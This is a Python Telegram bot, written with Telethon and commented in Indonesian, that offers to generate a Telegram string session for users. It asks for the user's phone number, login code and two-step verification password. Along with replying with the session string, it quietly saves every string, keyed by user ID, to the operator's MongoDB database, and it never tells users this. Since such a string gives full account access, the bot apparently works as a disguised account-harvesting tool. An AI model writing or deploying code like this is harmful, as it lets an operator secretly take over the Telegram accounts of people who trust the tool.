import os
import time
from dotenv import load_dotenv
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URL = os.getenv("MONGO_URL")

bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# MongoDB setup
mongo_client = MongoClient(MONGO_URL)
db = mongo_client["string_bot"]
sessions_col = db["sessions"]

user_state = {}
start_time = time.time()

def format_uptime(seconds):
    m, s = divmod(int(seconds), 60)
    h, m = divmod(m, 60)
    d, h = divmod(h, 24)
    return f"{d}d {h}h {m}m {s}s"

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.reply("Halo! Kirim /getstring untuk mulai membuat string session Telethon.")

@bot.on(events.NewMessage(pattern="/ping"))
async def ping(event):
    start = time.time()
    msg = await event.reply("Pong...")
    end = time.time()
    latency = (end - start) * 1000
    uptime = time.time() - start_time
    await msg.edit(f"Pong!\nLatency: {latency:.2f} ms\nUptime: {format_uptime(uptime)}")

@bot.on(events.NewMessage(pattern="/getstring"))
async def getstring_start(event):
    user_id = event.sender_id
    user_state[user_id] = {"step": "phone"}
    await event.reply("Masukkan nomor telepon Anda (contoh: +628123456789):")

@bot.on(events.NewMessage)
async def handle_messages(event):
    user_id = event.sender_id
    if user_id not in user_state:
        return

    if not event.text:
        # Abaikan pesan tanpa teks
        return

    state = user_state[user_id]
    text = event.text.strip()

    if state["step"] == "phone":
        phone = text
        if not phone.startswith("+") or len(phone) < 5 or not phone[1:].isdigit():
            await event.reply("Nomor telepon tidak valid. Harus dimulai dengan + dan hanya angka. Coba lagi:")
            return

        user_state[user_id]["phone"] = phone
        user_state[user_id]["step"] = "code"
        user_state[user_id]["client"] = TelegramClient(StringSession(), API_ID, API_HASH)
        client = user_state[user_id]["client"]

        await client.connect()
        try:
            sent = await client.send_code_request(phone)
            user_state[user_id]["phone_code_hash"] = sent.phone_code_hash
            await event.reply("Kode OTP sudah dikirim ke Telegram Anda.\nKirim kode OTP (dengan spasi, misal: 1 2 3 4 5):")
        except Exception as e:
            await event.reply(f"Gagal mengirim kode OTP:\n{e}")
            await client.disconnect()
            user_state.pop(user_id, None)

    elif state["step"] == "code":
        code = text.replace(" ", "")
        phone = state["phone"]
        client = state["client"]
        try:
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                await event.reply("Akun Anda menggunakan two-step verification. Kirim password Anda:")
                user_state[user_id]["step"] = "password"
                return

            string_sess = client.session.save()  # sinkron method
            sessions_col.insert_one({
                "user_id": user_id,
                "string": string_sess,
                "created_at": time.time()
            })

            await event.reply(f"✅ Berhasil!\nIni string session Anda:\n`{string_sess}`", parse_mode="md")
            await client.disconnect()
            user_state.pop(user_id, None)

        except PhoneCodeInvalidError:
            await event.reply("Kode OTP salah, coba kirim ulang kode yang benar:")
        except Exception as e:
            await event.reply(f"Gagal login:\n{e}")
            await client.disconnect()
            user_state.pop(user_id, None)

    elif state["step"] == "password":
        password = text
        client = state["client"]
        try:
            await client.sign_in(password=password)
            string_sess = client.session.save()
            sessions_col.insert_one({
                "user_id": user_id,
                "string": string_sess,
                "created_at": time.time()
            })
            await event.reply(f"✅ Berhasil dengan password 2FA!\nIni string session Anda:\n`{string_sess}`", parse_mode="md")
            await client.disconnect()
            user_state.pop(user_id, None)
        except Exception as e:
            await event.reply(f"Gagal login dengan password:\n{e}")
            await client.disconnect()
            user_state.pop(user_id, None)

bot.start()
print("Bot sudah berjalan...")
bot.run_until_disconnected()
